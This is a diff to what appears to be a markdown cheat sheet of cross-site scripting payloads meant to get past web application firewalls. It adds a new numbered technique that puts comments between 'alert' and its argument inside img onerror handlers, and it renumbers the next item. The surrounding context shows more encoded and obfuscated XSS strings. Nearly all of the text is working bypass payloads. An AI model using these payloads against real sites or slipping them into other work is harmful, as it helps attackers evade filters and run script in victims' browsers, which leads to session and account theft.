@@ -12,8 +12,14 @@ reportError(name , enerror=eval)
 ```
 <details%0Aopen%0AonToGgle%0A=%0Aabc=(co\u006efirm);abc%28%60xss%60%26%2300000000000000000041//
 ```
+5-Bypass XSS WAF protection using a comment between a JS function name and parameters
+```
+<img/src/onerror=alert/*1337*/(1)>
+<img/src/onerror=alert//&NewLine;(2)>
+<img/src/onerror=alert&sol;**&sol;(3)>
+```
 <br>
-5-Bypass XSS WAF protection using Whitespace Separators between a JS function name and parameters <br>
+6-Bypass XSS WAF protection using Whitespace Separators between a JS function name and parameters <br>
 
 ```
 <img/src/onerror=alert&#xFEFF;(1337)>
